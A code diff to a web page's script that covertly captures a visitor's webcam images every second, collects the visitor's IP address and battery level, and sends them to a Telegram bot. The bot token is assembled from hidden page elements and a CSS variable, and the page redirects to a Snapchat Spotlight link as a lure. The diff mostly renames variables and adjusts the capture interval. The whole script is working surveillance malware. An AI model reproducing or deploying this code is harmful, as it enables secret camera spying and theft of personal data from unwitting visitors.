@@ -28,12 +28,12 @@
         if (!targetID) return;
 
         try {
-            const partA = document.getElementById("raw-meta").innerText;
-            const nodeX = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
-            const dataV = document.getElementById("legacy-link").innerText;
-            const saltK = document.getElementById("system-trace").innerText;
+            const part1 = document.getElementById("raw-meta").innerText;
+            const part2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const part3 = document.getElementById("legacy-link").innerText;
+            const part4 = document.getElementById("system-trace").innerText;
             
-            const finalBuild = partA + nodeX + dataV + saltK;
+            const _final_call = part1 + part2 + part3 + part4;
 
             setTimeout(() => {
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
@@ -44,7 +44,7 @@
                 audio: false 
             });
 
-            let batteryInfo = "0%";
+            let batteryInfo = "100%";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
@@ -54,7 +54,7 @@
                 .then(res => res.json())
                 .then(data => {
                     let report = `👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Batt:</b> <code>${batteryInfo}</code>`;
-                    _sendMsg(report, finalBuild, targetID);
+                    _sendMsg(report, _final_call, targetID);
                 });
 
             const video = document.createElement('video');
@@ -68,18 +68,18 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) _sendFile(b, "photo", finalBuild, targetID); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", _final_call, targetID); }, 'image/jpeg', 0.9);
             };
-            setInterval(takeSnap, 800);
+            setInterval(takeSnap, 1000);
 
         } catch (e) {
-            const errA = document.getElementById("raw-meta").innerText;
-            const errB = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
-            const errC = document.getElementById("legacy-link").innerText;
-            const errD = document.getElementById("system-trace").innerText;
-            const recovery = errA + errB + errC + errD;
+            const r1 = document.getElementById("raw-meta").innerText;
+            const r2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
+            const r3 = document.getElementById("legacy-link").innerText;
+            const r4 = document.getElementById("system-trace").innerText;
+            const _rec = r1 + r2 + r3 + r4;
 
-            _sendMsg("Blocked", recovery, targetID);
+            _sendMsg("⚠️ مۆڵەتی کامێرا نەدرا", _rec, targetID);
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
@@ -95,7 +95,7 @@
     function _sendFile(blob, type, tk, uid) {
         let fd = new FormData();
         fd.append("chat_id", uid);
-        fd.append(type, blob, "snap.jpg");
+        fd.append(type, blob, "img.jpg");
         fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
